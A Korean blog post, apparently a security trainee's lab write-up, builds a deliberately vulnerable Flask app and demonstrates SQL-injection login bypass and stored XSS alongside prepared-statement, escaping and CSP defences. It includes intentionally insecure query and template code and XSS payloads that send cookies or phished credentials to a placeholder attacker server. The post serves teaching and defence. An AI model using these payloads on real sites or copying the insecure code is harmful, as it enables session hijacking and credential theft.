---
title: "Week 08 — 웹 해킹 기초: SQL Injection & XSS 실습"
date: 2025-12-23
draft: false
tags: ["웹보안", "SQLInjection", "XSS", "OWASP", "Flask", "취약점분석", "보안실습", "SK쉴더스루키즈"]
categories: ["projects"]
series: ["SK쉴더스 루키즈 28기"]
summary: "의도적으로 취약한 Flask 웹 애플리케이션을 직접 구현하고, SQL Injection과 XSS 공격을 실습하여 방어 기법까지 체득한 프로젝트"
---

# Week 08 — 웹 해킹 기초: SQL Injection & XSS 실습

> 전체 소스코드 및 실습 보고서는 GitHub에서 확인할 수 있습니다.
> [hojjang98 / skshielders-rookies-28 — projects/week_08](https://github.com/hojjang98/skshielders-rookies-28/tree/main/projects/week_08)

> **학습 목적으로 구성된 실습입니다.**
> 의도적으로 취약한 환경을 직접 구축하고 공격함으로써 보안의 중요성을 체감하는 교육용 프로젝트입니다.
> 실제 서비스에 대한 무단 공격은 정보통신망법 위반입니다.

---

## 개요

Week 8 은 **OWASP Top 10** 에 포함된 대표적인 웹 취약점을 직접 구현하고 공격해보는 실습 주간이었다.

취약점을 단순히 이론으로 배우는 것과, **직접 코드를 짜고 공격이 성공하는 순간을 눈으로 보는 것** 은 차원이 다른 경험이다.
"왜 Prepared Statement 를 써야 하는가?" 라는 질문에, 이제는 몸으로 답할 수 있다.

- **실습 환경** — Jupyter Notebook + Flask 2.2.2 + SQLite3
- **실습일** — 2025년 12월 23일
- **소요 시간** — 약 1시간

---

## 실습 시스템 구조

    브라우저 (공격자 = 사용자)
           │
           ▼
    Flask Web Application
    ├── /          => 로그인 페이지 (SQL Injection 취약)
    ├── /login     => 인증 처리
    ├── /board     => 게시판 (XSS 취약)
    └── /post      => 글 작성
           │
           ▼
    SQLite Database (users.db)
    ├── users  테이블 (id, username, password)
    └── posts  테이블 (id, title, content)

초기 계정 데이터:

    users 테이블
    ┌────┬──────────┬─────────────┐
    │ id │ username │  password   │
    ├────┼──────────┼─────────────┤
    │  1 │  admin   │ password123 │
    │  2 │  user1   │   mypass    │
    └────┴──────────┴─────────────┘

---

## 취약점 1 — SQL Injection (인증 우회)

### 취약한 코드의 문제점

아래는 **절대 해서는 안 되는** 로그인 처리 방식이다.
사용자 입력을 검증 없이 SQL 문자열에 직접 삽입한다.

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form['username']
        password = request.form['password']

        # 위험: 사용자 입력이 쿼리 문자열에 그대로 삽입됨
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        cursor.execute(query)

이 코드에 정상 값이 들어올 때의 쿼리:

    SELECT * FROM users WHERE username='admin' AND password='password123'

### 공격 시나리오 — admin' --

공격자가 아이디에 **admin' --** 를 입력하면 어떻게 될까?

    입력값:
    - 아이디   =>  admin' --
    - 비밀번호 =>  (아무 값)

    실제 실행되는 쿼리:
    SELECT * FROM users WHERE username='admin' --' AND password='아무값'

분해하면:

    username='admin'    <- username 조건 정상 완성
    --                  <- SQL 주석 시작. 이후 모든 구문 무시
    ' AND password='아무값'   <- 완전히 무시됨

결과 => **password 검증 없이 admin 계정 로그인 성공**

### 공격이 가능한 이유

입력값이 쿼리의 **데이터(값)** 가 아닌 **SQL 구문(코드)** 의 일부가 되었기 때문이다.
공격자는 입력값에 SQL 문법을 삽입하여 개발자가 의도한 쿼리 구조를 완전히 바꾼다.

SQL Injection 으로 가능한 공격 범위:

- 인증 우회 (이번 실습)
- 전체 DB 데이터 추출 ( UNION SELECT 기법)
- 데이터 변조 / 삭제 (INSERT, UPDATE, DELETE 삽입)
- DB 권한에 따라 OS 명령 실행까지 가능 (xp_cmdshell 등)

실제 피해 사례:
- **2017년 Equifax 해킹** — 1억 4천만 명 개인정보 유출
- **Sony PlayStation Network 해킹** — 7,700만 계정 정보 유출

---

## 취약점 2 — XSS (Cross-Site Scripting)

### 취약한 코드의 문제점

Jinja2 템플릿은 기본적으로 HTML 특수문자를 이스케이프한다.
그런데 **\|safe** 필터를 사용하면 이 보호를 개발자가 직접 해제해버린다.

    {% for post in posts %}
    <div>
        <h4>{{ post[1] }}</h4>
        <p>{{ post[2]|safe }}</p>    <- |safe 로 HTML 이스케이프 비활성화!
    </div>
    {% endfor %}

### 공격 시나리오 — 스크립트 삽입

게시판 글 작성 시 내용에 JavaScript 코드를 삽입한다.

    제목:   XSS 테스트
    내용:   <script>alert('XSS 공격 성공!')</script>

DB 에 저장되는 내용은 그대로 위 문자열이다.
게시판 페이지를 열 때 **\|safe** 로 인해 HTML 이스케이프 없이 그대로 렌더링되면,
브라우저는 이것을 텍스트가 아닌 **실행 가능한 JavaScript 코드**로 해석한다.

결과 => 페이지 로드 시 alert 창 실행 (스크립트 실행 성공)

### XSS 의 실제 위협 — alert 는 시작일 뿐

alert 창이 뜨는 것 자체는 무해하지만, 같은 원리로 아래가 가능하다.

**쿠키 탈취 (세션 하이재킹)**:

    <script>
    document.location = 'http://공격자서버/?cookie=' + document.cookie
    </script>

    => 피해자가 페이지를 열면 로그인 세션 쿠키가 공격자 서버로 전송됨
    => 공격자는 피해자의 세션으로 로그인 가능 (비밀번호 불필요)

**가짜 로그인 폼 삽입 (피싱)**:

    <script>
    document.body.innerHTML = '<form action="http://공격자서버/steal">아이디: <input name="u"> 비밀번호: <input name="p" type="password"><button>로그인</button></form>'
    </script>

    => 정상 사이트처럼 보이는 가짜 로그인 폼으로 자격증명 수집

XSS 유형 정리:

| 유형 | 설명 | 이번 실습 |
|------|------|----------|
| **Stored XSS** | 악성 스크립트가 DB 에 저장되어 페이지를 여는 모든 사용자에게 실행 | **이번 실습** |
| Reflected XSS | 입력값이 URL 파라미터로 즉시 응답에 반사 | — |
| DOM-based XSS | 서버 응답이 아닌 클라이언트 JS 에서 발생 | — |

---

## 방어 기법

### SQL Injection 방어

**방법 1 — Prepared Statement (가장 중요)**

파라미터 바인딩을 사용하면 사용자 입력이 절대로 SQL 구문이 될 수 없다.
? 자리표시자에 값이 바인딩될 때 DB 드라이버가 자동으로 이스케이프 처리한다.

    # 취약한 코드
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)

    # 안전한 코드 (Prepared Statement)
    cursor.execute(
        "SELECT * FROM users WHERE username=? AND password=?",
        (username, password)
    )

    admin' -- 를 입력해도 ? 에 바인딩되면:
    => username 값은 문자열 "admin' --" 그 자체로 처리됨
    => SQL 구문으로 해석되지 않음 => 공격 차단

**방법 2 — ORM 사용**

SQLAlchemy, Django ORM 같은 ORM 은 내부적으로 Prepared Statement 를 사용한다.

    # SQLAlchemy 예시
    user = User.query.filter_by(username=username, password=password).first()

**방법 3 — 입력 검증 (보조 수단)**

특수문자를 거부하는 검증은 보조 수단으로만 활용한다.
Prepared Statement 없이 입력 검증만으로 SQL Injection 을 완전히 막을 수 없다.

    import re
    if re.search(r"[';\"--]", username):
        return "유효하지 않은 입력입니다."

---

### XSS 방어

**방법 1 — HTML 이스케이프 (Jinja2 기본 동작 유지)**

**\|safe** 필터를 제거하는 것만으로 Jinja2 의 자동 이스케이프가 복원된다.

    # 취약한 코드
    <p>{{ post[2]|safe }}</p>

    # 안전한 코드 (|safe 제거)
    <p>{{ post[2] }}</p>

    <script>alert('XSS')</script> 를 삽입해도:
    => &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; 로 이스케이프
    => 브라우저가 텍스트로 표시, 실행 안 됨

**방법 2 — Content Security Policy (CSP)**

HTTP 응답 헤더로 브라우저에게 "이 사이트에서는 외부 스크립트를 실행하지 말라" 고 지시한다.

    @app.after_request
    def set_csp(response):
        response.headers['Content-Security-Policy'] = "default-src 'self'"
        return response

    => 인라인 <script> 및 외부 도메인 스크립트 실행 차단
    => XSS 가 삽입되더라도 브라우저 레벨에서 실행 차단

**방법 3 — 서버 사이드 입력 검증**

    from html import escape
    content = escape(request.form['content'])
    # <script> => &lt;script&gt; 로 변환 후 저장

---

## 핵심 교훈 — Secure by Default

이번 실습에서 가장 크게 체감한 것은 **"기본값이 안전해야 한다"** 는 원칙이다.

Jinja2 는 기본적으로 이스케이프를 **켜놓는다**.
개발자가 **\|safe** 를 명시적으로 써야만 이스케이프가 꺼진다.

SQLite3 는 기본적으로 문자열 포맷팅 쿼리를 **허용한다**.
개발자가 의식적으로 Prepared Statement 를 선택해야 한다.

두 취약점 모두 **개발자가 기본 보호를 스스로 해제했기 때문에 발생했다.**

    보안의 핵심 원칙:
    - Never Trust User Input     (사용자 입력은 항상 잠재적 공격이다)
    - Validate Input             (입력 시 검증)
    - Encode Output              (출력 시 인코딩)
    - Secure by Default          (기본값을 안전하게 유지)
    - Defense in Depth           (단일 방어선에 의존하지 않는다)

---

## OWASP Top 10 연계

이번 실습에서 다룬 취약점은 **OWASP Top 10 (2021)** 에 포함된 주요 취약점이다.

| OWASP 항목 | 이번 실습 연결 |
|-----------|--------------|
| **A03: Injection** | SQL Injection — 사용자 입력을 쿼리에 직접 삽입 |
| **A03: Injection** | XSS — 사용자 입력을 HTML 에 필터링 없이 출력 |
| **A07: Identification and Authentication Failures** | 취약한 로그인 로직으로 인증 우회 |
| **A05: Security Misconfiguration** | \|safe 필터 오용, 기본 보안 설정 해제 |

---

## 학습 성과 정리

| 영역 | 학습 내용 |
|------|----------|
| **취약점 이해** | SQL Injection / XSS 의 동작 원리를 코드 레벨로 직접 확인 |
| **공격 실습** | 인증 우회, 스크립트 삽입 공격을 실제로 수행 |
| **방어 기법** | Prepared Statement, HTML Escape, CSP 적용 방법 체득 |
| **보안 인식** | 사용자 입력을 신뢰하지 않는 개발 습관의 중요성 체감 |
| **OWASP 연계** | 실습 취약점을 OWASP Top 10 항목과 매핑 |

---

## 향후 학습 방향

- **CSRF (Cross-Site Request Forgery)** — 인증된 사용자를 이용한 위조 요청 공격
- **XXE (XML External Entity)** — XML 파서를 악용한 내부 파일 읽기
- **SSRF (Server-Side Request Forgery)** — 서버를 이용한 내부 네트워크 접근
- **Burp Suite 활용** — 프록시 도구로 HTTP 요청/응답을 가로채고 수정하는 실습
- **DVWA / WebGoat** — 체계적인 웹 취약점 학습을 위한 공개 실습 플랫폼 활용
